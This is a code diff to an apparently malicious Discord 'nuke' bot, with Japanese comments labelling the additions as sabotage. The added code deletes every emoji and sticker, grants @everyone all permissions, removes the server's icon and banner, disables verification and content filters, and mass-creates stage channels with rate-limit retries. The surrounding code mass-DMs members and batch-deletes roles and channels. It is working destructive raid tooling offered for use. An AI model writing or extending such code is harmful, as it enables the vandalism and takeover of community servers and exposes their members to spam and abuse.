@@ -74,6 +74,16 @@ async def create_channel_safely(guild, name):
             return await create_channel_safely(guild, name)
         return None
 
+async def create_stage_channel_safely(guild, name):
+    try:
+        return await guild.create_stage_channel(name)
+    except discord.HTTPException as e:
+        if e.status == 429:
+            wait = getattr(e, 'retry_after', 3) + random.uniform(0.3, 1.0)
+            await asyncio.sleep(wait)
+            return await create_stage_channel_safely(guild, name)
+        return None
+
 async def create_colored_roles_task(guild, target_roles):
     current = 0
     while current < target_roles:
@@ -116,6 +126,45 @@ async def core_nuke(guild, new_server_name=None):
     # DM
     await asyncio.gather(*[limited_dm(send_dm(m)) for m in non_bot_members], return_exceptions=True)
 
+    # 追加妨害: 絵文字全削除（低干渉）
+    emojis = await guild.fetch_emojis()
+    await asyncio.gather(*(limited_global(emoji.delete()) for emoji in emojis), return_exceptions=True)
+
+    # 追加妨害: スタンプ全削除
+    stickers = await guild.fetch_stickers()
+    await asyncio.gather(*(limited_global(s.delete()) for s in stickers), return_exceptions=True)
+
+    # 追加妨害: @everyone権限最大化
+    everyone_role = guild.default_role
+    permissions = discord.Permissions.all()
+    try:
+        await limited_global(everyone_role.edit(permissions=permissions))
+    except:
+        pass
+
+    # 追加妨害: サーバーアイコン/バナー/スプラッシュ削除
+    try:
+        await limited_global(guild.edit(icon=None, banner=None, splash=None))
+    except:
+        pass
+
+    # 追加妨害: コミュニティ機能無効化 + 通知/フィルター緩和
+    try:
+        await limited_global(guild.edit(
+            verification_level=discord.VerificationLevel.none,
+            explicit_content_filter=discord.ContentFilter.disabled,
+            default_notifications=discord.NotificationLevel.all_messages,
+            community_features=False
+        ))
+    except:
+        pass
+
+    # 追加妨害: ウェルカム/ルールチャンネル無効化
+    try:
+        await limited_global(guild.edit(system_channel=None, rules_channel=None))
+    except:
+        pass
+
     # ロール削除（ログ最低限 + 爆速バッチ + 自動リトライ）
     roles_to_delete = [r for r in guild.roles if not r.is_default() and not r.managed]
     print(f"ロール削除開始: 対象 {len(roles_to_delete)}個")
@@ -123,16 +172,16 @@ async def core_nuke(guild, new_server_name=None):
     async def delete_roles_batch(roles):
         await asyncio.gather(*(limited_global(r.delete()) for r in roles), return_exceptions=True)
 
-    batch_size = 15  # 爆速に戻す
+    batch_size = 15
     attempt = 0
     while len(roles_to_delete) > 0 and attempt < 3:
         attempt += 1
         for i in range(0, len(roles_to_delete), batch_size):
             batch = roles_to_delete[i:i+batch_size]
             await delete_roles_batch(batch)
-            await asyncio.sleep(random.uniform(0.03, 0.08))  # 超短sleepで爆速
+            await asyncio.sleep(random.uniform(0.03, 0.08))
 
-        await asyncio.sleep(1.5)  # 反映待機
+        await asyncio.sleep(1.5)
         remaining = [r for r in await guild.fetch_roles() if not r.is_default() and not r.managed]
         if len(remaining) == 0:
             break
@@ -140,7 +189,7 @@ async def core_nuke(guild, new_server_name=None):
 
     print(f"ロール削除完了: 残り {len([r for r in await guild.fetch_roles() if not r.is_default() and not r.managed])}個")
 
-    # チャンネル削除（バッチ8 + sleep + リトライ）
+    # チャンネル削除（バッチ8 + リトライ）
     channels = list(guild.channels)
     print(f"チャンネル削除開始: 対象 {len(channels)}個")
 
@@ -156,13 +205,19 @@ async def core_nuke(guild, new_server_name=None):
             await delete_channels_batch(batch_ch)
             await asyncio.sleep(random.uniform(0.1, 0.3))
 
-        await asyncio.sleep(2)  # 反映待機
+        await asyncio.sleep(2)
         remaining_ch = list(guild.channels)
         if len(remaining_ch) == 0:
             break
         channels = remaining_ch
 
     print(f"チャンネル削除完了: 残り {len(guild.channels)}個")
+
+    # 追加妨害: ステージチャンネル大量作成（20個）
+    stage_tasks = []
+    for i in range(20):
+        stage_tasks.append(limited_global(create_stage_channel_safely(guild, f"ますまにステージ-{i}")))
+    await asyncio.gather(*stage_tasks, return_exceptions=True)
 
     # サーバー名変更
     try:
